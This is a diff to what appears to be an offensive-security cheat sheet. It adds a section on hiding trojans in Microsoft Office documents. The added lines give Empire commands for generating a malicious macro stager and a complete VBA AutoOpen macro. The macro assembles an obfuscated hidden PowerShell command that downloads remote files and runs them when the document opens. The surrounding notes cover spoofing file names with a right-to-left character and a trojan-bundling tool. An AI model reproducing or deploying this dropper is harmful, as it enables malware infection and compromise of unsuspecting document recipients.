@@ -509,7 +509,6 @@ use autoit compiler to convert to EXE
 select an icon form iconarchive.com or serch img to icon on google exampl http://rw-designer.com/image-to-icon
 spoof the name add right-to-left character
 
-
 ## Trojan Factory
 - https://github.com/z00z/TrojanFactory
 Installation:
@@ -520,6 +519,50 @@ Installation:
     - Run --help for usage > python trojan_factory.py --help
 ```
 python trojan_factory.py -f (Front file url) -e (evil file url) -o (export path) -i (icon)
+```
+
+## Trojans in Microsoft Office Docs
+- Microsoft Office documents can run VBA code.
+- VBA can be used to download & execute files.
+- Create a normal document with VBA code to download & execute evil files.
+Now Empire made this really easy for us as it can generate macros,
+which are basically made of the code that we can embed inside Microsoft Office documents.
+```
+Run Empire
+usestager windows/macro
+info
+set Listener to (http or the one you created)
+set OutFile /http/server
+execute
+```
+Open Microsoft Office word,exel,powerpoint  
+View > Macros > Macros in document1 > create  
+copy past all code from macro created in empire  
+save as word 97-2003
+the target needs to enamble the content for the macro to work
+
+2 option. If don want to use empire macros add this download script whit the link to the troja to the macro document
+```
+Sub AutoOpen()
+    Dim cc As String
+    cc = "pow"
+    cc = cc + "ers"
+    cc = cc + "hell "
+    cc = cc + "-NoP -NonI -W Hidden """
+    
+    cc = cc + "('url1','url2')"
+    
+    cc = cc + "|foreach{$fileName=$env:temp+'\'+(Split-Path -Path $_ -Leaf);"
+    
+    cc = cc + "(new-object System.Net.WebClient).DownloadFile($_,$fileName);"
+    
+    cc = cc + "Invoke-Item $fileName;}"
+    
+    cc = cc + """"
+
+    VBA.CreateObject("WScript.Shell").Run cc, 0
+
+End Sub
 ```
 
 ## ZLogger (keyloger)
